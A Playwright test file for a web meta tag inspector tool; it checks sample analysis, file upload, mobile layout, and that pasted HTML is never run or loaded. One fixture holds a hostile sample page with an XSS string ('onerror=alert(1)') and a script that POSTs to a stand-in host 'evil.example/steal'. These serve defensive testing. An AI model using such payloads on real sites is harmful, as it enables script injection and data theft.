import { expect, test, type Page } from '@playwright/test';

function watch(page: Page, baseURL: string | undefined) {
  const origin = new URL(baseURL!).origin;
  const bad: string[] = [];
  page.on('request', (r) => {
    const url = r.url();
    if (url.startsWith('data:') || url.startsWith('blob:')) return;
    if (!url.startsWith(`${origin}/`) || r.method() !== 'GET') bad.push(`${r.method()} ${url}`);
  });
  page.on('console', (m) => m.type() === 'error' && bad.push(`console: ${m.text()}`));
  page.on('pageerror', (e) => bad.push(`pageerror: ${e.message}`));
  return bad;
}


const HOSTILE = `<!doctype html><html><head>
<title>Hostile page with a reasonably long title here</title>
<meta name="description" content="<img src=x onerror=alert(1)>">
<meta property="og:image" content="https://tracker.example/pixel.png">
<script>window.__pwned = true; fetch('https://evil.example/steal', { method: 'POST' });</script>
<link rel="stylesheet" href="https://evil.example/style.css">
</head><body><img src="https://evil.example/img.png" onerror="window.__pwned=true"><h1>Hi</h1></body></html>`;

test('analyses the sample and shows previews without loading images', async ({ page, baseURL }) => {
  const bad = watch(page, baseURL);
  await page.goto('/tools/meta-tag-inspector');
  await expect(page.getByRole('heading', { name: /check your meta tags/i })).toBeVisible();
  await page.getByRole('button', { name: 'Load sample' }).click();
  await expect(page.getByText('Google result')).toBeVisible();
  await expect(page.getByText('Handmade Ceramic Mugs | Clay & Co. Pottery Studio').first()).toBeVisible();
  await expect(page.getByText('https://clay.example/img/mugs-og.jpg').first()).toBeVisible();
  await expect(page.getByText('Product', { exact: true })).toBeVisible();
  await expect(page.getByText(/1 of 1 image lack/)).toBeVisible();
  await expect(page.getByText('X card (summary_large_image)')).toBeVisible();
  expect(bad).toEqual([]);
});

test('never runs or loads pasted HTML', async ({ page, baseURL }) => {
  const bad = watch(page, baseURL);
  await page.goto('/tools/meta-tag-inspector');
  await page.getByRole('textbox', { name: /Page HTML/ }).fill(HOSTILE);
  await expect(page.getByText('<img src=x onerror=alert(1)>').first()).toBeVisible();
  await expect(page.getByText('https://tracker.example/pixel.png').first()).toBeVisible();
  expect(await page.evaluate(() => (window as unknown as { __pwned?: boolean }).__pwned)).toBeUndefined();
  expect(bad).toEqual([]);
});

test('opens a saved HTML file', async ({ page }) => {
  await page.goto('/tools/meta-tag-inspector');
  await page.getByTestId('file-input').setInputFiles({ name: 'page.html', mimeType: 'text/html', buffer: Buffer.from('<html lang="fr"><head><title>Bonjour</title></head><body></body></html>') });
  await expect(page.getByText('page.html', { exact: true })).toBeVisible();
  await expect(page.getByText(/Title is 7 characters/)).toBeVisible();
});

test('no horizontal scroll at 320px', async ({ page }) => {
  await page.setViewportSize({ width: 320, height: 800 });
  await page.goto('/tools/meta-tag-inspector');
  await page.getByRole('button', { name: 'Load sample' }).click();
  await expect(page.getByText('Google result')).toBeVisible();
  const overflow = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
  expect(overflow).toBeLessThanOrEqual(0);
});
